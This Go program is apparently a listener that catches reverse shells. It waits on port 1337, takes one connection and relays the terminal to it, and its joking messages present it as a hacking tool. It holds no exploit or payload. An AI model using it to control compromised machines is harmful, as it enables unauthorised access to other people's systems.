package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"

	"golang.org/x/crypto/ssh/terminal"
)

const PORT = "1337"

func main() {
	l, err := net.Listen("tcp", ":"+PORT)
	if nil != err {
		log.Fatalf("Could not bind to interface", err)
	}
	defer l.Close()
	c, err := l.Accept()
	if nil != err {
		log.Fatalf("Could not accept connection", err)
	}
	fmt.Println("Something is coming from", c.RemoteAddr())
	fmt.Println("A Shit Shell is Spawned :)")

	// Set stdin in raw mode.
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		panic(err)
	}
	defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.

	// I am HaCk1nG LOL
	go io.Copy(c, os.Stdin)
	io.Copy(os.Stdout, c)
}
